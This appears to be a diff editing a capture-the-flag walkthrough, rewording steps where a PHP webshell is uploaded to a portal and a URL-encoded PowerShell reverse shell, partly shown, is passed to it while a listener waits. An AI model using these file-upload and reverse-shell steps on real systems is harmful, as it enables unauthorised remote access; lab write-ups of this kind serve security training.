@@ -448,7 +448,7 @@ After logging into the portal, we notice that we can upload files to it via the 
 
 ![](revshell_upload.png)
 
-We can open a listener, upload a PHP reverse shell generated via [revshells](https://www.revshells.com/), and then visit the appropriate directory (which should be the `dashboard/uploads/<revshell>` that we found earlier):
+We can open a listener, upload a PHP webshell, and then visit the appropriate directory (which should be the `dashboard/uploads/<revshell>` that we found earlier):
 
 ```bash
 # webshell's contents
@@ -462,7 +462,7 @@ listening on [any] 1337 ...
 
 ![](svc_web_shell.png)
 
-Now, we can create a PowerShell-based reverse shell, URL-encode it, and pass it as a command:
+Now, we can create a PowerShell-based reverse shell, URL-encode it, and pass it as a command to our webshell:
 
 ```bash
 # our reverse PowerShell
@@ -480,8 +480,6 @@ powershell%20%2Dep%20bypass%20%2Dnop%20%2Dc%20%22%24client%20%3D%20New%2DObject%
 ```
 
 We are now ready to pass it as a command to our webshell:
-
-
 
 ```bash
 # opening a listener to catch the shell
